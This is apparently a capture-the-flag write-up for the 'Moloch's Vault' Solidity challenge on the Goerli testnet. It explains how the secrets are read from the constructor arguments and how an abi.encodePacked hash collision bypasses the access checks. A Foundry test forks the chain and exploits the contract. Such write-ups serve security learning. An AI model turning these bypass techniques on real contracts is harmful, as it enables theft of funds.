## Moloch’s Vault attack

Moloch's Vault is deployed on Goerli on address 0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f.

The `sendGrant` function transfers exactly 1 wei to an address given in the constructor and is protected by the following condition

```solidity
require(Moloch == keccak256(abi.encodePacked(msg.sender)) || realHacker[msg.sender], "Far $rm success!!");
```

The function `uhER778` sets `realHacker[msg.sender] = true;` if we pass all the required checks.

To pass all the checks we need to know some variables which were set on the deployment of the contract. To find the values, we can use etherscan.

https://goerli.etherscan.io/address/0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f#code
Section: Constructor Arguments

Here we can find all the constructor arguments that were given on the deployment.

Important values:

```bash
Arg [0] : molochPass (string): BLOODY PHARMACIST
Arg [1] : _b (string[2]): WHO DO YOU,SERVE?
```

- `BLOODY PHARMACIST` is needed as the first element in `_openSecrete` to bypass the first check `hsah == keccak256(abi.encode(_openSecrete[0]))`
- `WHO DO YOU` and `SERVE?` are needed to bypass the second check `hy7UIH == keccak256(abi.encodePacked(_openSecrete[1],_openSecrete[2]))`
- Ty bypass the third check `keccak256(abi.encode(_openSecrete[1])) != keccak256(abi.encode(question[0]))` we can't use `WHO DO YOU` as the second argument in `_openSecrete` as this is checked that it is different
- Ty bypass the last check `YHUiiFD - RGDTjhU == 1` we need to make sure to send to the contract 2 wei when we receive the 1 wei from the call in the function.

As `abi.encodePacked` is used in the second check, we can just put together value1 + value2 and leave the second string with "".

This will result in the same `keccak256` for `abi.encodePacked` and result in a different value in `abi.encode(_openSecrete[1])`

After we successfully called `uhER778` we're now a realHacker and can call the `sendGrant` function.

The POC shows how we can send `WHO DO YOU` and `SERVE?` as one value and leave the second empty and get us approved as a realHacker.

## Test

forge test --match-contract=MOLOCH_VAULT_Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

interface IMOLOCH {
    function uhER778(string[3] memory _openSecrete) external payable;
    function sendGrant(address payable _grantee) external payable;
}

contract MOLOCH_VAULT_Test is Test {

    IMOLOCH molochVault;
    function setUp() public {
        // we fork Goerli, so we can use the original MOLOCH_VAULT
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli");
        molochVault = IMOLOCH(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f);
    }

    function testAttack() public {

        // 57484f20444f20594f55 = WHO DO YOU
        // 53455256453f = SERVE?
        bytes memory secret1 = hex"57484f20444f20594f55_53455256453f";
        bytes memory secret2 = hex""; // SERVE?

        string[3] memory _openSecrete = [
            "BLOODY PHARMACIST", // molochPass
            string(secret1), // _b[0] WHO DO YOU
            string(secret2) //  _b[1] SERVE?
        ];

        sendEthBackToMoloch = true;
        molochVault.uhER778(_openSecrete);        

        // proove with a balance check
        uint256 balanceStart = address(this).balance;

        // now we're a realHacker and we can use the sendGrant function
        sendEthBackToMoloch = false;
        molochVault.sendGrant(payable(address(this)));

        uint256 balanceAfter = address(this).balance;

        assertEq(balanceStart + 1, balanceAfter);
    }

    bool sendEthBackToMoloch;
    receive() external payable {
        // pass the balance check and send eth back
        if (sendEthBackToMoloch) {
            payable(address(molochVault)).transfer(2);
        }        
    }
}
```
